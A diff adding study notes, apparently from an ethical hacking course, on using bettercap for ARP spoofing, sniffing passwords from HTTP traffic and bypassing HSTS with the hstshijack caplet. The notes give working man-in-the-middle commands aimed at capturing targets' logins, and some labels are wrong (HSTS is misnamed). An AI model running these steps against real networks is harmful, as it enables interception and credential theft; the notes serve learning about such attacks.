@@ -193,18 +193,62 @@ _____________________________________________
 
 6. Here you can use arp.spoof to steal passwords
 
----------------------------------------------------
+------------------------------------------------------------------
 
 73. Sniffing Passwords 
 ***
 
-1. 
+1. $ set arp.spoof.fullduplex true
+2. $ arp.spoof.internal true
+3. $ set arp.spoof.targets 10.0.2.6  # For Multiple Targets -> use comma
+4. $ arp.spoof on
 
----------------------------------------------------
+5. SNIFF IS A GENERAL TERM IN CYBERSEC MEAN STEALING
+
+6. $ help net.sniff 
+7. $ net.sniff on
+8. GO google : unicornitems.com with windows ( a HTTP website )
+   NOTE : !!! IF IT IS HTTPS WEBSITE THE PACKETS WOULD BE ENCRYPTED
+9. Now we will see the infos in terminal like user id, password
+
+------------------------------------------------------------------
 
 74. HSTS ( HTTP Script Transport Security )
 ***
 
-1. 
+1. IF TARGET GOES TO HTTPS WEBSITE WE ONLY KNOW WHICH WEBSITE THE TARGET HAS GONE FOR BUT NOT THE CONTENTS
+
+2. WHAT WE SHOULD DO IS THAT WE HAVE TO DOWNGRADE THE HTTPS --> HTTP so that we will be able to get the contents
+
+3. MOST OF THE TIME IT IS NOT SUCCESSFUL BUT WE CAN TRY
+
+4. HERE COMES HSTS , IT DIRECTS BROWSER TO RUN IN HTTPS
+
+5. NOW IN BETTERCAP WE CAN USE CAPLETS TO OVERCOME THIS :
+   $ caplets.show
+   # Caplets are the pieces of code that you can run in the bettercap
+   To find bettercap : /usr/share/bettercap/caplets/caplet_file_name.cap
+
+6. NOTE !!! : It might work or not work
+
+7. NOW IN TERMINAL :
+   $ cd /usr/share/bettercap/caplets
+   $ nano hstshijack.cap # or emacs
+   # NOW IT CAN DOWNGRADE HTTPS TO HTTPS
+
+   NOW IN BETTERCAP : 
+   $ hstshijack/hstshijack
+
+8. Now try to go to linkedin.com andyou can see that is not secured
+   # MAY BE YOU CANNOT ABLE TO DOWNGRADE ANYOTHER WEBSITE
+
+9. If Target Logs in inside we can capture the contents
+
+10. ALTERNATE : 
+   # Go Tutors Github : atilsamancioglu/hstshijackcaplet
+   # YOU CAN DOWNLOAD AS ZIP FILE
+   # AND YOU CAN MOVE ALL THESE THINGS TO SAME ROOT DIRECTORY AND DELETE PRE EXISTING FILES
+
+--------------------------------------------------------------------
 
 
